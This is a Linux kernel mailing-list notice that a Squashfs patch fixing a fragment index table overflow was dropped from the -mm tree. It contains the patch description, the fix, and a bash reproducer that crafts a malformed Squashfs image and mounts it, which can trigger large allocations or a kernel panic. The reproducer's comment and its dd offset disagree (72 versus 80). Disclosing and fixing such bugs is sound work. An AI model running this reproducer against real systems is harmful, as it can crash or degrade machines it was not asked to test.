Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=100.103.45.18
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1795585297;
	b=TxYEO6Sfp/MTSCkh6UHM5AHKJlTq1jQm4hapgOGtBKBGZn9qHLjX5Fj30EzaCZfln8Cs
	 MP8qzUT93jZf+E3s3QJLWARih0UQKfNOSiJNF92bMPxURg0stgVm3IN97IzRyjq3vNpG2
	 O2O65K/3hcmdaBFJbDr5a75AegLeBc1g2GOQlS4NVhYsXBzgQpW2H1oba0anC3BNS36Ib
	 diKXPVldQ8DaipGfla+2XMsr7lc0pO1jAEYebv+udNmJBUgWboWhfPzRrL3mEXee5UBtk
	 FFlhgE68YpdsUTl+KxUBEE7UeuqsMQPEOchRwLQUnEPwTLo7auNaVSUNCNZbMy9iRAQ==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1795585297;
	h=Received:DKIM-Signature:Date:To:From:In-Reply-To:References:Subject:
	 Message-Id;
	bh=nH81BYwLks3IK+fJPj8g+GXudCGfxPKo4PB3EM5ToJo=;
	b=hu100YJVP/0n30ia47LsNYTOE7nxO+WqYdsfZ6Y6BO1bZqkmzjaHzY3Sxvgzt/tDYmwM
	 eeXdJtCjQEKvi29aJv9HiV7gVmSJxNtqkd4V+rzHJWS4yMoLEL8Rq3yVtb5QRZQPD09sx
	 0aBTiBfYprxtYKofQKGrzWWFHIbhfuvuG53LjaYD8LGUjQoKjW5fW/XIqRjDKRwCTt0IH
	 stgZ4W781I+6i+tSCvccIpk+ayTg+U0Ee+eVz9USIRo2VolgsFc4yc7B2bJKehv15jw7Z
	 NxIBoUVe+0eux/ucrM/iqS+IKecopwkAqBgu2liyu7fgkpN0bSFoWwzM3akGlCVjHcA==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dkim=pass header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=k+Xog2UY;
	arc=none smtp.remote-ip=100.103.45.18
Received: from smtp.kernel.org (quasi.space.kernel.org [100.103.45.18])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id AAB35606A31E
	for <mm-commits@vger.kernel.org>; Wed, 25 Nov 2026 05:41:37 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=k+Xog2UY
Received: by smtp.kernel.org (Postfix) with ESMTPSA id 81B081F000C4;
	Wed, 25 Nov 2026 05:41:36 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
	d=linux-foundation.org; s=korg; t=1795585296;
	bh=nH81BYwLks3IK+fJPj8g+GXudCGfxPKo4PB3EM5ToJo=;
	h=Date:To:From:In-Reply-To:References:Subject;
	b=k+Xog2UYKLmpcp79XUaBIZ8ddiUwh3jI+YICfUm+mvDBUxkriNWtylLq5pmGAducH
	 fki/ncmFZ739xFGdSZ/Msx7DMN67CMVRi3hdqExSXlFLi4GnSoCJbqOy4n/GTQXZko
	 S612JXB65Vwf3I4470FHiQHKgQhiDOW6eu8xGMH0=
Date: Tue, 24 Nov 2026 21:41:36 -0800
To: mm-commits@vger.kernel.org,phillip@squashfs.org.uk,
	akpm@linux-foundation.org
From: Andrew Morton <akpm@linux-foundation.org>
In-Reply-To: <20261123034304.261742-11-phillip@squashfs.org.uk>
References: <20261123034304.261742-11-phillip@squashfs.org.uk>
Subject: [to-be-updated] squashfs-fix-fragment-index-table-length-too-large-exploit.patch removed from -mm tree
Message-Id: <20261125054136.81B081F000C4@smtp.kernel.org>
X-Mailing-List: mm-commits@vger.kernel.org
List-Id: <mm-commits.vger.kernel.org>
List-Post: <mailto:mm-commits@vger.kernel.org>
List-Help: <mailto:mm-commits+help@vger.kernel.org>
List-Subscribe: <mailto:mm-commits+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:mm-commits+unsubscribe@vger.kernel.org>
List-Owner: <mailto:mm-commits+owner@vger.kernel.org>
Precedence: list


The quilt patch titled
     Subject: Squashfs: fix fragment index table length too large exploit
has been removed from the -mm tree.  Its filename was
     squashfs-fix-fragment-index-table-length-too-large-exploit.patch

This patch was dropped because an updated version will be issued

------------------------------------------------------
From: Phillip Lougher <phillip@squashfs.org.uk>
Subject: Squashfs: fix fragment index table length too large exploit
Date: Mon, 23 Nov 2026 03:42:51 +0000

An attacker can manipulate the fragment count and the fragment table
start values in the superblock, and force the code to kmalloc()
a 4 Mbyte memory region, or try to allocate larger values which
will fail with a warning, and which will panic the kernel if panic on
warn is set.

If the allocation succeeds, these invalid values will be caught when the
code tries to read the data from disk, but, this leaves a small time
window where the 4 Mbyte block is allocated before being freed when
the mount of the filesystem fails.

The exploit relies on arithmetic overflow to evade the following sanity
check:

	if (fragment_table_start + length > next_table)

Specifically, the values of fragment_table_start and length can be
chosen so that they overflow an unsigned long long, and so appear less
than next_table.

Typically, the maximum memory that can be allocated with kmalloc() is
4 Mbytes.  So if length is 4 Mbytes, this means fragment_table_start
needs to be 2^64 - 4 Mbytes, to achieve overflow and produce a zero
length.

This value is beyond the end of any block device, because the maximum
block device is 2^63 - 512 in size (LLONG_MAX >> 9 sectors of 512
bytes).

In practice this means such a large value will be caught when the code
immediately after allocation tries to read the data off disk:

 	table = squashfs_read_table(sb, fragment_table_start, length);

However, the code should check for validity before allocating a large
kmalloc() area, because such allocations can cause memory pressure or
cause the kernel to panic.

This commit checks that fragment_tables_size is not too large, and
ensures arithmetic overflow does not occur.

It also makes the sanity check more exacting by utilising the fact that
there should be zero gap between the end of the fragment index table and
the next table.

Reproducer
=========

The following script if the eploit works, will fail with the mount
error

mount: attempt to access beyond end of device

=================================================================
#!/bin/bash

ARGS="-quiet -no-progress"

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

# Create a Squashfs filesystem with a single file.
#
DIR=$(mktemp -d)

pushd $DIR 2>&1 > /dev/null

echo Create the Squashfs filesystem

if ! mksquashfs - img.sqsh -p "/ d 0777 0 0" -p "/file f 0777 0 0 echo hello" $ARGS; then
	echo Failed to create Squashfs filesystem
	finish

fi

# The fragments field (fragment count) in the superblock is at offset
# 16 bytes.
#
# Over-write the fragments count with 268,435,456 little-endian.
# This will make the kernel try to kmalloc() 4 Mbytes to hold the
# fragment index table.
#

# Write 268,435,456 in little-endian format to file
/usr/bin/echo -en "\x00\x00\x00\x10" > file

# Over-write the fragments count in the superblock
echo Over-write the fragments count in the superblock

dd bs=1 seek=16 if=file of=img.sqsh count=4 conv=notrunc status=none

# The fragment table start (start of the index table) in the superblock
# is at offset 72 bytes.
#
# Over-write the value with 2^64 - 4 Mbytes little-endian.
# This value with the index table length will overflow an unsigned
# long long, giving the value 0.  This will evade the sanity check.

# Write 2^64 - 4 Mbytes in little-endian format to file
/usr/bin/echo -en "\x00\x00\xc0\xff\xff\xff\xff\xff" > file

# Over-write the fragment table start in the superblock
echo Over-write the fragment table start in the superblock

dd bs=1 seek=80 if=file of=img.sqsh count=8 conv=notrunc status=none

# Mount the filesystem to /mnt
echo Mount the filesystem to /mnt

# If the eploit works, the mount will fail with
# mount: attempt to access beyond end of device

if ! mount -t squashfs img.sqsh /mnt; then
	echo Mount of Squashfs filesystem failed
	finish
fi

popd 2>&1 > /dev/null

rm -rf $DIR
=================================================================

Link: https://patch.msgid.link/20261123034304.261742-11-phillip@squashfs.org.uk
Fixes: 1cac63cc9b2f ("Squashfs: add sanity checks to fragment reading at mount time")
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
Cc: Christian Loehle <christian.loehle@arm.com>
Cc: Dan Carpenter <error27@gmail.com>
Cc: Phillip Lougher <phillip.lougher@gmail.com>
Cc: syzbot ci <syzbot+ci04e7314748e3f6be@syzkaller.appspotmail.com>

 fs/squashfs/fragment.c |    8 ++++----
 1 file changed, 4 insertions(+), 4 deletions(-)

--- a/fs/squashfs/fragment.c~squashfs-fix-fragment-index-table-length-too-large-exploit
+++ a/fs/squashfs/fragment.c
@@ -68,11 +68,11 @@ __le64 *squashfs_read_fragment_index_tab
 	__le64 *table;
 
 	/*
-	 * Sanity check, length bytes should not extend into the next table -
-	 * this check also traps instances where fragment_table_start is
-	 * incorrectly larger than the next table start
+	 * The computed size of the index table (length bytes) should exactly
+	 * match the table start and end points
 	 */
-	if (fragment_table_start + length > next_table)
+	if (fragment_table_start >= next_table ||
+				length != (next_table - fragment_table_start))
 		return ERR_PTR(-EINVAL);
 
 	table = squashfs_read_table(sb, fragment_table_start, length);
_

Patches currently in -mm which might be from phillip@squashfs.org.uk are

squashfs-sanity-check-inode-metadata-block-location.patch
squashfs-sanity-check-directory-metadata-block-location.patch
squashfs-widen-xattr-count-variables-and-add-sanity-check.patch
squashfs-very-large-files-can-exceed-an-int-or-size_t.patch
squashfs-add-more-sanity-checking-to-squashfs_block_size.patch
squashfs-sanity-check-fragment-block-location-and-range.patch
squashfs-sanity-check-block-list-sizes-and-range.patch
squashfs-dont-store-large-export-table-indexes-in-memory.patch
squashfs-dont-store-large-fragment-table-indexes-in-memory.patch
squashfs-dont-store-large-xattr-id-table-indexes-in-memory.patch
squashfs-fix-variables-in-directory-code-and-add-more-sanity-checks.patch
squashfs-fix-regression-in-squashfs_copy_cache.patch
squashfs-check-index-isnt-greater-than-s64_max-in-squashfs_read_data.patch

